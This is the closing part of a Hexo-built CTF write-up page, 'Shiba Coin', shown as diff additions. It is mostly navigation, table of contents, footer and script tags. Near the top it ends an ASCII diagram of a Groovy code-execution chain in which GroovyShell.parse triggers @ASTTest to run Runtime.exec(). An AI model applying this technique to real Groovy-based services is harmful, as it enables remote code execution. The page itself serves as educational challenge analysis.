class="line">+-----------------------------+</span><br><span class="line">| compileScript(...)          |</span><br><span class="line">| - GroovyShell.parse(...)    |</span><br><span class="line">| - triggers @ASTTest         |</span><br><span class="line">|   → assert Runtime.exec()   |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure></div>
+
+
+
+		</div>
+
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/CTF/">#CTF</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/BKSEC/">#BKSEC</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Blockchain/">#Blockchain</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/06/10/linux-privlege-escalation_skills-assessment/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Linux Privlege Escalation Skill Assessment</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/04/24/emojicrypt/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">emojicrypt</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">Shiba Coin</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ShibaCoin-web"><span class="nav-text">ShibaCoin - web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Phan-tich"><span class="nav-text">Phân tích</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Phan-tich-source-code"><span class="nav-text">Phân tích source code:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit"><span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Bonus"><span class="nav-text">Bonus</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Groovy-la-gi"><span class="nav-text">Groovy là gì?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ASTTest-la-gi"><span class="nav-text">@ASTTest là gì?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-Gadget-Chain"><span class="nav-text">Analysis Gadget Chain</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ensureInitializedOrReloaded"><span class="nav-text">ensureInitializedOrReloaded()</span></a></li></ol></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+            <div class="customize-info my-1">404 Not Found. But you found me :)</div>
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2025</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Taneora</a>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
